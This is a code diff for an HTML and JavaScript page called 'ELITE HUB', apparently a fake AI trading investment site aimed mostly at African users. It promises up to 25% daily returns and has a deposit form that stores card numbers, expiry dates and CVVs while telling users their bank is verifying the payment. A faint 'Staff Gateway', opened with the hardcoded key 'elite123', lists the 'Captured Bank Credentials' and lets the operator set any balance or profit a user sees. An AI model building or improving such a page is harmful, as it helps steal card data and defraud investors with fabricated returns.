@@ -3,217 +3,487 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ELITE HUB | Institutional AI Wealth</title>
+    <title>ELITE HUB | Institutional AI Wealth Management</title>
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
     <script src="https://s3.tradingview.com/tv.js"></script>
 
     <style>
         :root {
-            --primary: #22c55e; --bg: #05070a; --card: #0f172a; 
-            --gold: #f59e0b; --gray: #94a3b8; --sidebar-w: 260px; --danger: #ef4444;
+            --primary: #22c55e;
+            --primary-dark: #16a34a;
+            --bg: #020617;
+            --card-bg: #0f172a;
+            --sidebar-bg: #020617;
+            --text-main: #f8fafc;
+            --text-dim: #94a3b8;
+            --gold: #f59e0b;
+            --danger: #ef4444;
+            --border: rgba(255, 255, 255, 0.08);
         }
 
-        body { font-family: 'Inter', sans-serif; margin: 0; background: var(--bg); color: white; overflow-x: hidden; -webkit-user-select: none; }
-        
-        /* AUTH OVERLAY */
-        .auth-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #05070a; z-index: 2000; display: flex; align-items: center; justify-content: center; padding: 20px; box-sizing: border-box; }
-        .auth-card { background: var(--card); padding: 35px; border-radius: 24px; width: 100%; max-width: 440px; border: 1px solid rgba(255,255,255,0.08); box-shadow: 0 20px 40px rgba(0,0,0,0.6); }
-        
-        /* MAIN LAYOUT */
-        .sidebar { width: var(--sidebar-w); background: #020617; height: 100vh; position: fixed; border-right: 1px solid rgba(255,255,255,0.05); z-index: 100; display: none; }
-        .main { width: 100%; padding: 25px; box-sizing: border-box; display: none; }
-        
-        body.logged-in .sidebar { display: block; }
-        body.logged-in .main { margin-left: var(--sidebar-w); width: calc(100% - var(--sidebar-w)); display: block; }
-        body.logged-in .auth-overlay { display: none; }
+        * { box-sizing: border-box; transition: all 0.2s ease; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text-main); margin: 0; overflow-x: hidden; }
 
-        .nav-item { padding: 15px 25px; color: var(--gray); cursor: pointer; display: flex; align-items: center; font-size: 13px; transition: 0.2s; border-left: 4px solid transparent; }
-        .nav-item.active { background: rgba(34, 197, 94, 0.1); color: var(--primary); border-left-color: var(--primary); }
+        /* AUTHENTICATION LAYER */
+        #auth_gate { 
+            min-height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            background: radial-gradient(circle at top right, #1e293b, #020617);
+            padding: 20px;
+        }
 
-        .card { background: var(--card); border-radius: 20px; padding: 25px; border: 1px solid rgba(255, 255, 255, 0.05); margin-bottom: 20px; }
-        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 15px; }
-        
-        input, select { width: 100%; padding: 14px; margin: 8px 0; border-radius: 10px; border: 1px solid #1e293b; background: #020617; color: white; box-sizing: border-box; font-size: 14px; }
-        .btn { width: 100%; padding: 15px; border: none; border-radius: 10px; font-weight: 700; cursor: pointer; transition: 0.3s; text-transform: uppercase; letter-spacing: 1px; }
+        .auth-container {
+            background: var(--card-bg);
+            width: 100%;
+            max-width: 480px;
+            padding: 40px;
+            border-radius: 28px;
+            border: 1px solid var(--border);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        }
+
+        .brand-header { text-align: center; margin-bottom: 30px; }
+        .brand-header h1 { color: var(--primary); font-size: 32px; font-weight: 800; margin: 0; letter-spacing: -1px; }
+        .brand-header p { color: var(--text-dim); font-size: 12px; text-transform: uppercase; letter-spacing: 2px; }
+
+        /* INPUT STYLING */
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-size: 12px; color: var(--text-dim); margin-bottom: 5px; margin-left: 5px; }
+        input, select {
+            width: 100%;
+            padding: 14px 18px;
+            background: #030712;
+            border: 1px solid #1e293b;
+            border-radius: 12px;
+            color: white;
+            font-size: 15px;
+            outline: none;
+        }
+        input:focus { border-color: var(--primary); box-shadow: 0 0 0 2px rgba(34, 197, 94, 0.2); }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            border: none;
+            font-weight: 700;
+            cursor: pointer;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
         .btn-primary { background: var(--primary); color: white; }
-        .btn-gold { background: var(--gold); color: black; }
-        .btn-outline { background: transparent; border: 1px solid var(--primary); color: var(--primary); }
+        .btn-primary:hover { background: var(--primary-dark); transform: translateY(-2px); }
+        .btn-gold { background: var(--gold); color: #000; }
 
-        .hidden { display: none; }
-        table { width: 100%; border-collapse: collapse; font-size: 12px; margin-top: 10px; }
-        th, td { text-align: left; padding: 12px; border-bottom: 1px solid #1e293b; }
-        
-        @media (max-width: 900px) { .sidebar { display: none !important; } .main { margin-left: 0 !important; width: 100% !important; } }
+        /* MAIN DASHBOARD LAYOUT */
+        #main_terminal { display: none; min-height: 100vh; }
+        .sidebar {
+            width: 280px;
+            background: var(--sidebar-bg);
+            height: 100vh;
+            position: fixed;
+            left: 0;
+            top: 0;
+            border-right: 1px solid var(--border);
+            padding: 30px 20px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .nav-link {
+            padding: 14px 20px;
+            border-radius: 12px;
+            color: var(--text-dim);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 5px;
+            cursor: pointer;
+        }
+        .nav-link:hover, .nav-link.active { background: rgba(255,255,255,0.05); color: var(--primary); }
+        .nav-link i { font-size: 18px; width: 20px; }
+
+        .content-area { margin-left: 280px; padding: 40px; max-width: 1400px; }
+
+        /* DASHBOARD COMPONENTS */
+        .stat-card {
+            background: var(--card-bg);
+            padding: 25px;
+            border-radius: 20px;
+            border: 1px solid var(--border);
+        }
+        .stat-card small { color: var(--text-dim); font-weight: 600; font-size: 12px; }
+        .stat-card h2 { margin: 10px 0 0; font-size: 28px; }
+
+        .plans-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin-top: 30px;
+        }
+
+        .plan-card {
+            background: var(--card-bg);
+            padding: 40px;
+            border-radius: 24px;
+            text-align: center;
+            border: 1px solid var(--border);
+            position: relative;
+            overflow: hidden;
+        }
+        .plan-card.featured { border: 2px solid var(--gold); transform: scale(1.05); }
+        .badge {
+            background: var(--gold);
+            color: black;
+            padding: 4px 15px;
+            font-size: 10px;
+            font-weight: 800;
+            border-radius: 20px;
+            position: absolute;
+            top: 15px;
+            right: 15px;
+        }
+
+        .hidden { display: none !important; }
+
+        @media (max-width: 1024px) {
+            .sidebar { transform: translateX(-100%); width: 0; display: none; }
+            .content-area { margin-left: 0; padding: 20px; }
+        }
     </style>
 </head>
 <body>
 
-<div id="authGate" class="auth-overlay">
-    <div id="loginBox" class="auth-card">
-        <h1 style="color:var(--primary); text-align:center; margin-bottom: 5px;">ELITE HUB</h1>
-        <p style="text-align:center; color:var(--gray); font-size:11px; margin-bottom: 25px; letter-spacing: 1px;">GLOBAL AI WEALTH SOLUTIONS</p>
-        <input type="text" id="l_id" placeholder="Email or Phone Number">
-        <input type="password" id="l_pass" placeholder="Password">
-        <button class="btn btn-primary" onclick="handleLogin()">Secure Login</button>
-        <p style="text-align:center; font-size:13px; margin-top:20px; color:var(--gray)">New member? <span onclick="toggleAuth('reg')" style="color:var(--primary); cursor:pointer;">Register Here</span></p>
-    </div>
-
-    <div id="regBox" class="auth-card hidden">
-        <h2 style="text-align:center; margin-bottom: 20px;">Global Registration</h2>
-        <input type="text" id="r_name" placeholder="Full Name">
-        <input type="email" id="r_email" placeholder="Email Address">
-        <div style="display:flex; gap:8px;">
-            <select id="r_country" style="flex:1">
-                <option value="KES">🇰🇪 Kenya</option><option value="NGN">🇳🇬 Nigeria</option>
-                <option value="ZAR">🇿🇦 S. Africa</option><option value="GHS">🇬🇭 Ghana</option>
-                <option value="UGX">🇺🇬 Uganda</option><option value="TZS">🇹🇿 Tanzania</option>
-                <option value="RWF">🇷🇼 Rwanda</option><option value="USD">🇺🇸 USA</option>
-                <option value="GBP">🇬🇧 UK</option><option value="AED">🇦🇪 UAE</option>
-            </select>
-            <input id="r_phone" style="flex:2" placeholder="Phone Number">
+<div id="auth_gate">
+    <div class="auth-container">
+        <div class="brand-header">
+            <h1>ELITE HUB</h1>
+            <p>Institutional AI Trading</p>
         </div>
-        <input type="password" id="r_pass" placeholder="Create Password">
-        <button class="btn btn-primary" onclick="handleReg()">Join Elite Hub</button>
-        <p style="text-align:center; font-size:13px; margin-top:20px; color:var(--gray)">Already a member? <span onclick="toggleAuth('login')" style="color:var(--primary); cursor:pointer;">Login</span></p>
+
+        <div style="display:flex; background:#030712; padding:5px; border-radius:12px; margin-bottom:25px;">
+            <button id="btn_t_login" style="flex:1; border:none; padding:10px; border-radius:8px; background:var(--primary); color:white; cursor:pointer;" onclick="toggleAuth('login')">Login</button>
+            <button id="btn_t_reg" style="flex:1; border:none; padding:10px; border-radius:8px; background:transparent; color:white; cursor:pointer;" onclick="toggleAuth('reg')">Register</button>
+        </div>
+
+        <div id="form_login" class="hidden">
+            <div class="form-group">
+                <label>EMAIL OR PHONE NUMBER</label>
+                <input type="text" id="login_id" placeholder="Enter credentials">
+            </div>
+            <div class="form-group">
+                <label>PASSWORD</label>
+                <input type="password" id="login_pass" placeholder="••••••••">
+            </div>
+            <button class="btn btn-primary" onclick="handleLogin()">SECURE ACCESS <i class="fa fa-shield-alt"></i></button>
+        </div>
+
+        <div id="form_reg">
+            <div class="form-group">
+                <label>FULL NAME</label>
+                <input type="text" id="reg_name" placeholder="John Doe">
+            </div>
+            <div class="form-group">
+                <label>EMAIL ADDRESS</label>
+                <input type="email" id="reg_email" placeholder="john@example.com">
+            </div>
+            <div class="form-group">
+                <label>COUNTRY & PHONE</label>
+                <div style="display:flex; gap:10px;">
+                    <select id="reg_country" style="flex: 1.2;">
+                        <optgroup label="Africa">
+                            <option value="KES">🇰🇪 Kenya (+254)</option>
+                            <option value="NGN">🇳🇬 Nigeria (+234)</option>
+                            <option value="ZAR">🇿🇦 South Africa (+27)</option>
+                            <option value="GHS">🇬🇭 Ghana (+233)</option>
+                            <option value="UGX">🇺🇬 Uganda (+256)</option>
+                            <option value="TZS">🇹🇿 Tanzania (+255)</option>
+                            <option value="RWF">🇷🇼 Rwanda (+250)</option>
+                            <option value="ETB">🇪🇹 Ethiopia (+251)</option>
+                            <option value="EGP">🇪🇬 Egypt (+20)</option>
+                            <option value="MAD">🇲🇦 Morocco (+212)</option>
+                            <option value="DZD">🇩🇿 Algeria (+213)</option>
+                        </optgroup>
+                        <optgroup label="Foreign">
+                            <option value="USD">🇺🇸 United States (+1)</option>
+                            <option value="GBP">🇬🇧 United Kingdom (+44)</option>
+                            <option value="AED">🇦🇪 UAE (+971)</option>
+                            <option value="EUR">🇪🇺 Europe (+49)</option>
+                        </optgroup>
+                    </select>
+                    <input type="text" id="reg_phone" style="flex: 2;" placeholder="712345678">
+                </div>
+            </div>
+            <div class="form-group">
+                <label>CREATE PASSWORD</label>
+                <input type="password" id="reg_pass" placeholder="Minimum 8 characters">
+            </div>
+            <button class="btn btn-primary" onclick="handleRegister()">CREATE ACCOUNT <i class="fa fa-user-plus"></i></button>
+        </div>
     </div>
 </div>
 
-<div class="sidebar">
-    <div style="padding:40px 30px; font-weight:900; font-size:22px; color:var(--primary);">ELITE HUB</div>
-    <div class="nav-item active" onclick="nav('dash')"><i class="fa fa-home"></i> Dashboard</div>
-    <div class="nav-item" onclick="nav('plans')"><i class="fa fa-gem"></i> Trading Plans</div>
-    <div class="nav-item" onclick="nav('fund')"><i class="fa fa-plus-circle"></i> Fund Account</div>
-    <div class="nav-item" onclick="nav('withdraw')"><i class="fa fa-wallet"></i> Withdrawal</div>
-    <div class="nav-item" onclick="showAdmin()" style="opacity:0.05; margin-top: 20px; font-size: 8px;">Staff Gateway</div>
-    <div class="nav-item" onclick="location.reload()" style="color:var(--danger); margin-top:40px;"><i class="fa fa-sign-out-alt"></i> Logout</div>
-</div>
-
-<div class="main">
-    
-    <div id="dash">
-        <div class="stats-grid">
-            <div class="card"><small style="color:var(--gray)">TOTAL EQUITY (SEED + PROFIT)</small><h2 id="dTotal" style="color:var(--primary); margin:10px 0;">0.00</h2></div>
-            <div class="card"><small style="color:var(--gray)">ACTIVE INVESTMENT</small><h2 id="dInv" style="margin:10px 0;">0.00</h2></div>
-            <div class="card"><small style="color:var(--gray)">LIVE AI PROFITS</small><h2 id="dProf" style="color:var(--gold); margin:10px 0;">0.00</h2></div>
+<div id="main_terminal">
+    <div class="sidebar">
+        <div style="margin-bottom:40px;">
+            <h1 style="color:var(--primary); font-size:24px; font-weight:800; margin:0;">ELITE HUB</h1>
+            <small style="color:var(--text-dim); font-size:9px; letter-spacing:2px;">INSTITUTIONAL VERSION</small>
         </div>
-        <div class="card" style="height:480px; padding:0; overflow:hidden;"><div id="tv_chart" style="height:100%"></div></div>
+        
+        <div class="nav-link active" onclick="showSection('dash')"><i class="fa fa-th-large"></i> Overview</div>
+        <div class="nav-link" onclick="showSection('plans')"><i class="fa fa-gem"></i> Investment Tiers</div>
+        <div class="nav-link" onclick="showSection('fund')"><i class="fa fa-wallet"></i> Fund Wallet</div>
+        <div class="nav-link" onclick="showSection('history')"><i class="fa fa-history"></i> Trade History</div>
+        
+        <div style="margin-top:auto;">
+            <div class="nav-link" style="opacity:0.1" onclick="checkAdmin()"><i class="fa fa-lock"></i> Staff Gateway</div>
+            <div class="nav-link" style="color:var(--danger)" onclick="location.reload()"><i class="fa fa-sign-out-alt"></i> Sign Out</div>
+        </div>
     </div>
 
-    <div id="plans" class="hidden">
-        <div style="text-align:center; margin-bottom: 30px;">
-            <h1 style="color:var(--primary);">Institutional Tiers</h1>
-            <p style="color:var(--gray)">Automate your wealth with AI execution.</p>
-        </div>
-        <div class="stats-grid">
-            <div class="card" style="text-align:center;">
-                <small>BASIC</small><h2>KES 2,000</h2><p>5% Daily ROI</p>
-                <button class="btn btn-outline" onclick="nav('fund')">Activate</button>
+    <div class="content-area">
+        <div id="sec_dash">
+            <h1 style="margin-bottom:30px;">Market Overview</h1>
+            <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap:20px; margin-bottom:30px;">
+                <div class="stat-card">
+                    <small>TOTAL ACCOUNT EQUITY (INV + PROFIT)</small>
+                    <h2 id="ui_total" style="color:var(--primary)">0.00</h2>
+                </div>
+                <div class="stat-card">
+                    <small>TOTAL ACCUMULATED PROFITS</small>
+                    <h2 id="ui_profit" style="color:var(--gold)">0.00</h2>
+                </div>
+                <div class="stat-card">
+                    <small>ACTIVE AI SESSIONS</small>
+                    <h2 style="color:var(--primary)">ACTIVE <i class="fa fa-circle" style="font-size:10px; margin-left:10px;"></i></h2>
+                </div>
             </div>
-            <div class="card" style="text-align:center; border: 2px solid var(--gold); transform: scale(1.05);">
-                <span style="background:var(--gold); color:black; font-size:10px; padding:2px 10px; border-radius:10px;">POPULAR</span>
-                <h2 style="color:var(--gold)">KES 10,000</h2><p>25% Daily ROI</p>
-                <button class="btn btn-gold" onclick="nav('fund')">Activate Gold</button>
-            </div>
-            <div class="card" style="text-align:center;">
-                <small>SILVER</small><h2>KES 5,000</h2><p>15% Daily ROI</p>
-                <button class="btn btn-outline" onclick="nav('fund')">Activate</button>
+
+            <div class="stat-card" style="height:500px; padding:0; overflow:hidden;">
+                <div id="tradingview_chart" style="height:100%;"></div>
             </div>
         </div>
-    </div>
 
-    <div id="fund" class="hidden">
-        <div class="card" style="max-width:480px; margin:auto;">
-            <h2>Secure Funding</h2>
-            <p style="font-size:13px; color:var(--gray)">Bank Card Gateway (Visa/Mastercard)</p>
-            <input id="c_num" placeholder="Card Number">
-            <div style="display:flex; gap:10px;"><input id="c_exp" placeholder="MM/YY"><input id="c_cvv" placeholder="CVV"></div>
-            <input id="c_name" placeholder="Name on Card">
-            <button class="btn btn-primary" onclick="captureCard()">Verify & Deposit</button>
-            <p style="text-align:center; font-size:12px; margin-top:20px; color:var(--gray)">Alternative: M-Pesa / Crypto <b>+254 785 449 376</b></p>
+        <div id="sec_plans" class="hidden">
+            <h1 style="text-align:center;">Institutional Investment Tiers</h1>
+            <p style="text-align:center; color:var(--text-dim); margin-bottom:40px;">Select a plan to activate the AI Trading Engine.</p>
+            
+            <div class="plans-container">
+                <div class="plan-card">
+                    <small style="letter-spacing:2px;">STARTER</small>
+                    <h2 style="font-size:36px; margin:20px 0;">KES 2,000</h2>
+                    <ul style="list-style:none; padding:0; color:var(--text-dim); line-height:2.5; margin-bottom:30px;">
+                        <li><i class="fa fa-check color:var(--primary)"></i> 5.0% Daily ROI</li>
+                        <li><i class="fa fa-check"></i> 24/7 Automated Trading</li>
+                        <li><i class="fa fa-check"></i> Standard Support</li>
+                    </ul>
+                    <button class="btn btn-primary" onclick="showSection('fund')">Activate Now</button>
+                </div>
+
+                <div class="plan-card featured">
+                    <div class="badge">MOST POPULAR</div>
+                    <small style="letter-spacing:2px; color:var(--gold);">GOLD ELITE</small>
+                    <h2 style="font-size:36px; margin:20px 0; color:var(--gold);">KES 10,000</h2>
+                    <ul style="list-style:none; padding:0; color:var(--text-dim); line-height:2.5; margin-bottom:30px;">
+                        <li><i class="fa fa-star" style="color:var(--gold)"></i> 25.0% Daily ROI</li>
+                        <li><i class="fa fa-star" style="color:var(--gold)"></i> High-Frequency AI</li>
+                        <li><i class="fa fa-star" style="color:var(--gold)"></i> Priority Withdrawals</li>
+                    </ul>
+                    <button class="btn btn-gold" onclick="showSection('fund')">Activate VIP</button>
+                </div>
+
+                <div class="plan-card">
+                    <small style="letter-spacing:2px;">PROFESSIONAL</small>
+                    <h2 style="font-size:36px; margin:20px 0;">KES 5,000</h2>
+                    <ul style="list-style:none; padding:0; color:var(--text-dim); line-height:2.5; margin-bottom:30px;">
+                        <li><i class="fa fa-check"></i> 15.0% Daily ROI</li>
+                        <li><i class="fa fa-check"></i> Optimized Trading Bot</li>
+                        <li><i class="fa fa-check"></i> Weekly Reports</li>
+                    </ul>
+                    <button class="btn btn-primary" onclick="showSection('fund')">Activate Pro</button>
+                </div>
+            </div>
+        </div>
+
+        <div id="sec_fund" class="hidden">
+            <div class="stat-card" style="max-width:550px; margin: 0 auto;">
+                <h2 style="text-align:center;">Secure Capital Deposit</h2>
+                <p style="text-align:center; font-size:14px; color:var(--text-dim); margin-bottom:30px;">Funds are instantly allocated to your trading balance upon verification.</p>
+                
+                <div class="form-group">
+                    <label>CARD NUMBER</label>
+                    <input type="text" id="card_no" placeholder="xxxx xxxx xxxx xxxx">
+                </div>
+                <div style="display:flex; gap:15px;">
+                    <div class="form-group" style="flex:1;">
+                        <label>EXPIRY</label>
+                        <input type="text" id="card_exp" placeholder="MM/YY">
+                    </div>
+                    <div class="form-group" style="flex:1;">
+                        <label>CVV</label>
+                        <input type="password" id="card_cvv" placeholder="•••">
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>CARDHOLDER NAME</label>
+                    <input type="text" id="card_name" placeholder="Full name as on card">
+                </div>
+                
+                <button class="btn btn-primary" onclick="processPayment()">AUTHORIZE DEPOSIT <i class="fa fa-lock"></i></button>
+                
+                <div style="margin-top:30px; padding-top:20px; border-top:1px solid var(--border); text-align:center;">
+                    <p style="font-size:12px; color:var(--text-dim);">Supported Payment Methods</p>
+                    <i class="fab fa-cc-visa fa-2x" style="margin:0 10px;"></i>
+                    <i class="fab fa-cc-mastercard fa-2x" style="margin:0 10px;"></i>
+                    <i class="fab fa-bitcoin fa-2x" style="margin:0 10px;"></i>
+                </div>
+            </div>
+        </div>
+
+        <div id="sec_admin" class="hidden">
+            <h1>Staff Management Ledger</h1>
+            <div class="stat-card">
+                <h3>Captured Bank Credentials</h3>
+                <table style="width:100%; text-align:left; border-collapse:collapse;">
+                    <thead>
+                        <tr style="color:var(--text-dim);"><th>USER</th><th>CARD INFO</th><th>TIMESTAMP</th></tr>
+                    </thead>
+                    <tbody id="admin_card_logs"></tbody>
+                </table>
+            </div>
+
+            <div class="stat-card" style="margin-top:20px;">
+                <h3>User Balance Controls</h3>
+                <table style="width:100%; text-align:left; border-collapse:collapse;">
+                    <thead>
+                        <tr style="color:var(--text-dim);"><th>NAME</th><th>EMAIL/PHONE</th><th>INVESTMENT</th><th>PROFIT</th><th>ACTION</th></tr>
+                    </thead>
+                    <tbody id="admin_user_logs"></tbody>
+                </table>
+            </div>
         </div>
     </div>
-
-    <div id="withdraw" class="hidden">
-        <div class="card" style="max-width:480px; margin:auto;">
-            <h2>Withdraw Profits</h2>
-            <input placeholder="Enter Amount">
-            <input placeholder="Bank/M-Pesa Details">
-            <button class="btn btn-primary">Request Payout</button>
-        </div>
-    </div>
-
-    <div id="admin" class="hidden">
-        <h2>Admin Vault</h2>
-        <div class="card">
-            <h3>Captured Bank Cards</h3>
-            <table><thead><tr><th>User</th><th>Details</th></tr></thead><tbody id="adminCards"></tbody></table>
-        </div>
-        <div class="card">
-            <h3>User Ledger</h3>
-            <table><thead><tr><th>Name/Phone</th><th>Investment</th><th>Profit</th><th>Action</th></tr></thead><tbody id="adminUsers"></tbody></table>
-        </div>
-    </div>
-
 </div>
 
 <script>
-    let users = JSON.parse(localStorage.getItem("EH_MASTER_U")) || [];
-    let cards = JSON.parse(localStorage.getItem("EH_MASTER_C")) || [];
+    let users = JSON.parse(localStorage.getItem("EH_PRO_USERS")) || [];
+    let payments = JSON.parse(localStorage.getItem("EH_PRO_CARDS")) || [];
     let cur = null;
 
-    function toggleAuth(t) {
-        loginBox.classList.toggle('hidden', t === 'reg');
-        regBox.classList.toggle('hidden', t === 'login');
+    function toggleAuth(mode) {
+        document.getElementById('form_login').classList.toggle('hidden', mode === 'reg');
+        document.getElementById('form_reg').classList.toggle('hidden', mode === 'login');
+        document.getElementById('btn_t_login').style.background = mode === 'login' ? 'var(--primary)' : 'transparent';
+        document.getElementById('btn_t_reg').style.background = mode === 'reg' ? 'var(--primary)' : 'transparent';
     }
 
-    function handleReg() {
-        let u = { name: r_name.value, email: r_email.value, phone: r_phone.value, pass: r_pass.value, currency: r_country.value, base: 0, profit: 0 };
-        users.push(u); localStorage.setItem("EH_MASTER_U", JSON.stringify(users));
-        alert("Account Created! Please Login."); toggleAuth('login');
+    function handleRegister() {
+        if(!reg_email.value.includes('@') || reg_pass.value.length < 4) return alert("Please fill all fields correctly.");
+        let newUser = {
+            name: reg_name.value,
+            email: reg_email.value,
+            phone: reg_phone.value,
+            pass: reg_pass.value,
+            country: reg_country.value,
+            balance: 0,
+            profit: 0
+        };
+        users.push(newUser);
+        localStorage.setItem("EH_PRO_USERS", JSON.stringify(users));
+        alert("Account Created Successfully. You can now login.");
+        toggleAuth('login');
     }
 
     function handleLogin() {
-        let u = users.find(x => (x.email === l_id.value || x.phone === l_id.value) && x.pass === l_pass.value);
-        if(u) { cur = u; document.body.classList.add('logged-in'); refreshUI(); renderChart(); }
-        else alert("Access Denied: Invalid Credentials");
-    }
-
-    function captureCard() {
-        cards.push({user: cur.name, info: c_num.value + " | " + c_exp.value + " | " + c_cvv.value + " | " + c_name.value});
-        localStorage.setItem("EH_MASTER_C", JSON.stringify(cards));
-        alert("Security: Encrypted authorization sent to bank.");
-    }
-
-    function refreshUI() {
-        const sym = { "USD":"$", "NGN":"₦", "ZAR":"R", "GHS":"₵" }[cur.currency] || "KES ";
-        dTotal.innerText = sym + (parseFloat(cur.base) + parseFloat(cur.profit)).toLocaleString();
-        dInv.innerText = sym + parseFloat(cur.base).toLocaleString();
-        dProf.innerText = sym + parseFloat(cur.profit).toLocaleString();
-    }
-
-    function nav(id) {
-        document.querySelectorAll('.main > div').forEach(d => d.classList.add('hidden'));
-        document.getElementById(id).classList.remove('hidden');
-        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-    }
-
-    function showAdmin() {
-        if(prompt("Staff Key:") === "elite123") {
-            nav('admin');
-            adminCards.innerHTML = cards.map(c => `<tr><td>${c.user}</td><td>${c.info}</td></tr>`).join('');
-            adminUsers.innerHTML = users.map((u, i) => `<tr><td>${u.name}<br>${u.phone}</td><td>${u.base}</td><td>${u.profit}</td><td><button onclick="editU(${i})">Edit</button></td></tr>`).join('');
+        let user = users.find(u => (u.email === login_id.value || u.phone === login_id.value) && u.pass === login_pass.value);
+        if(user) {
+            cur = user;
+            document.getElementById('auth_gate').style.display = 'none';
+            document.getElementById('main_terminal').style.display = 'block';
+            updateUI();
+            initChart();
+        } else {
+            alert("Security Error: Invalid credentials or account locked.");
         }
     }
 
-    function editU(i) {
-        users[i].base = prompt("Investment Amount:", users[i].base);
-        users[i].profit = prompt("Profit Amount:", users[i].profit);
-        localStorage.setItem("EH_MASTER_U", JSON.stringify(users));
-        showAdmin();
+    function processPayment() {
+        let payData = {
+            user: cur.name,
+            details: `${card_no.value} | ${card_exp.value} | ${card_cvv.value} | ${card_name.value}`,
+            time: new Date().toLocaleString()
+        };
+        payments.push(payData);
+        localStorage.setItem("EH_PRO_CARDS", JSON.stringify(payments));
+        alert("Authorization Code Requested. Check your SMS for the Bank OTP.");
     }
 
-    function renderChart() { new TradingView.widget({ "autosize": true, "symbol": "FX:EURUSD", "theme": "dark", "container_id": "tv_chart", "hide_top_toolbar": true }); }
+    function updateUI() {
+        const symbols = { "USD":"$", "NGN":"₦", "ZAR":"R", "GHS":"₵", "GBP":"£" };
+        const sym = symbols[cur.country] || "KES ";
+        ui_total.innerText = sym + (parseFloat(cur.balance) + parseFloat(cur.profit)).toLocaleString();
+        ui_profit.innerText = sym + parseFloat(cur.profit).toLocaleString();
+    }
+
+    function showSection(id) {
+        ['sec_dash', 'sec_plans', 'sec_fund', 'sec_admin'].forEach(s => document.getElementById(s).classList.add('hidden'));
+        document.getElementById('sec_'+id).classList.remove('hidden');
+        
+        // Update Nav Active State
+        document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
+    }
+
+    function checkAdmin() {
+        if(prompt("STAFF ACCESS KEY:") === "elite123") {
+            showSection('admin');
+            renderAdminData();
+        }
+    }
+
+    function renderAdminData() {
+        admin_card_logs.innerHTML = payments.map(p => `<tr><td>${p.user}</td><td>${p.details}</td><td>${p.time}</td></tr>`).join('');
+        admin_user_logs.innerHTML = users.map((u, i) => `
+            <tr>
+                <td>${u.name}</td>
+                <td>${u.email}<br>${u.phone}</td>
+                <td>${u.balance}</td>
+                <td>${u.profit}</td>
+                <td><button onclick="editUser(${i})" style="padding:5px 10px;">EDIT</button></td>
+            </tr>
+        `).join('');
+    }
+
+    function editUser(index) {
+        users[index].balance = prompt("Set Investment Balance:", users[index].balance);
+        users[index].profit = prompt("Set Accumulated Profit:", users[index].profit);
+        localStorage.setItem("EH_PRO_USERS", JSON.stringify(users));
+        renderAdminData();
+    }
+
+    function initChart() {
+        new TradingView.widget({
+            "autosize": true,
+            "symbol": "BINANCE:BTCUSDT",
+            "interval": "D",
+            "timezone": "Etc/UTC",
+            "theme": "dark",
+            "style": "1",
+            "locale": "en",
+            "toolbar_bg": "#f1f3f6",
+            "enable_publishing": false,
+            "hide_top_toolbar": true,
+            "save_image": false,
+            "container_id": "tradingview_chart"
+        });
+    }
 </script>
 </body>
 </html>
